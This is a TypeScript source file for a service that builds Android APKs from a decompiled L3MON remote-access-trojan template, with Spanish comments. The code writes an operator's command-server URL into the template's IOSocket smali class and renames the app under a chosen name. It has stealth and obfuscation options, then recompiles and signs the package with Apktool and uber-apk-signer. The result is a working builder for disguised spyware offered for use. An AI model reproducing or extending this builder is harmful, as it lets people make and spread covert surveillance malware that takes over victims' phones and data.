import { execSync } from "child_process";
import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync, statSync } from "fs";
import { join, resolve, dirname, basename } from "path";
import { fileURLToPath } from "url";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";
import { eq } from "drizzle-orm";

/**
 * Servicio de compilación de APK basado en el concepto L3MON
 * Utiliza Apktool para re-compilar y un firmador automático
 */

export interface CompilationConfig {
  buildId: number;
  appName: string;
  packageName: string;
  versionCode: number;
  versionName: string;
  stealthMode: boolean;
  enableSSL: boolean;
  ports: number[];
  iconPath?: string;
  payloadCode: string;
  obfuscate: boolean;
  targetArchitectures: string[];
}

export interface BuildResult {
  success: boolean;
  buildId: number;
  apkPath?: string;
  error?: string;
  logs: string[];
  compilationTime: number;
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

class APKCompiler {
  private projectRoot: string;
  private assetsDir: string;
  private buildDir: string;
  private apktoolPath: string;
  private signerPath: string;

  constructor() {
    this.projectRoot = resolve(join(__dirname, ".."));
    this.assetsDir = join(this.projectRoot, "server", "assets");
    this.buildDir = join(this.projectRoot, "apk-builds");
    this.apktoolPath = join(this.assetsDir, "apktool.jar");
    this.signerPath = join(this.assetsDir, "sign.jar");

    if (!existsSync(this.buildDir)) {
      mkdirSync(this.buildDir, { recursive: true });
    }
  }

  /**
   * Preparar el proyecto temporal para compilar
   */
  private prepareProject(config: CompilationConfig): string {
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
    const tempProjectDir = join(buildIdDir, "project");

    if (existsSync(buildIdDir)) {
      execSync(`powershell -Command "Remove-Item -Path '${buildIdDir}' -Recurse -Force"`);
    }
    mkdirSync(tempProjectDir, { recursive: true });

    // Copiar el template decompilado
    const templateDir = join(this.assetsDir, "apk-template");
    execSync(`powershell -Command "Copy-Item -Path '${templateDir}\\*' -Destination '${tempProjectDir}' -Recurse -Force"`);

    // 1. Inyectar URL en IOSocket.smali
    const ioSocketPath = join(tempProjectDir, "smali", "com", "etechd", "l3mon", "IOSocket.smali");
    if (existsSync(ioSocketPath)) {
      let content = readFileSync(ioSocketPath, "utf8");
      
      // Auto-fix URL (Protocolo y Puerto)
      let serverUrl = config.payloadCode || "http://localhost:3000";
      if (!serverUrl.startsWith("http")) serverUrl = `http://${serverUrl}`;
      
      // Si no tiene puerto, añadir el puerto por defecto (:3000)
      const urlObj = new URL(serverUrl);
      if (!urlObj.port) {
          const port = process.env.PORT || "3000";
          serverUrl = `${urlObj.protocol}//${urlObj.hostname}:${port}`;
      }

      console.log(`[APKCompiler] Injecting Server URL: ${serverUrl}`);
      // El placeholder en el template es "http://x:22222?model="
      content = content.replace(/http:\/\/x:22222\?model=/g, `${serverUrl}?model=`);
      writeFileSync(ioSocketPath, content);
      
      // Guardar el log para el usuario
      if (!config.payloadCode) config.payloadCode = serverUrl; // Para que aparezca en el log global
    }

    // 2. Modificar App Name en strings.xml
    const stringsPath = join(tempProjectDir, "res", "values", "strings.xml");
    if (existsSync(stringsPath)) {
      try {
        let content = readFileSync(stringsPath, "utf8");
        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
        writeFileSync(stringsPath, content);
      } catch (e) {
        console.warn("[APKCompiler] Error actualizando app_name:", e);
      }
    }

    return tempProjectDir;
  }

  async compileAPK(config: CompilationConfig): Promise<BuildResult> {
    const startTime = Date.now();
    const logs: string[] = [];
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);

    try {
      logs.push(`[${new Date().toISOString()}] Iniciando construcción Platinum (Smali Hooking)...`);
      logs.push(`Configuración: ${config.appName} | ${config.packageName}`);
      
      const projectDir = this.prepareProject(config);
      logs.push(`Template inyectado correctamente en: ${projectDir}`);

      // Compilar con Apktool
      const unsignedApk = join(buildIdDir, "unsigned.apk");
      logs.push(`[${new Date().toISOString()}] Re-compilando Smali con Apktool...`);
      execSync(`java -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}"`, { stdio: "pipe" });

      // Firmar y Alinear con Uber Apk Signer
      logs.push(`[${new Date().toISOString()}] Firmando paquete con uber-apk-signer...`);
      const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
      execSync(`java -jar "${uberSignerPath}" -a "${unsignedApk}" -o "${buildIdDir}" 2>&1`, { stdio: "pipe" });
      
      const signedTempApk = join(buildIdDir, "unsigned-aligned-debugSigned.apk");
      // Renombrar al nombre limpio de la app
      const finalSignedApk = join(buildIdDir, `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`);
      if (existsSync(signedTempApk)) {
          renameSync(signedTempApk, finalSignedApk);
      }

      if (!existsSync(finalSignedApk)) {
        throw new Error("Error crítico: El APK final no se generó o falló la firma.");
      }

      logs.push(`[${new Date().toISOString()}] ¡Construcción Exitosa!`);
      const compilationTime = Date.now() - startTime;
      
      await this.updateBuildStatus(config.buildId, "ready", finalSignedApk, logs);

      return {
        success: true,
        buildId: config.buildId,
        apkPath: finalSignedApk,
        logs,
        compilationTime,
      };

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      logs.push(`[ERROR] ${errorMsg}`);
      await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);
      return { success: false, buildId: config.buildId, error: errorMsg, logs, compilationTime: Date.now() - startTime };
    }
  }

  private async updateBuildStatus(
    buildId: number,
    status: "building" | "ready" | "failed" | "expired",
    apkPath?: string,
    logs?: string[],
    error?: string
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const updateData: any = { status };
      if (apkPath) updateData.apkUrl = apkPath;
      // Write logs to the correct column, safely truncated to 4000 chars
      if (logs) updateData.buildLogs = logs.join("\n").substring(0, 4000);
      await db.update(apkBuilds).set(updateData).where(eq(apkBuilds.id, buildId));
    } catch (err) {
      console.error("[APKCompiler] Error actualizando estado en DB:", err);
    }
  }

  getAPKInfo(apkPath: string) {
    const stats = statSync(apkPath);
    return { size: stats.size, path: apkPath, name: basename(apkPath) };
  }
}

export const apkCompiler = new APKCompiler();
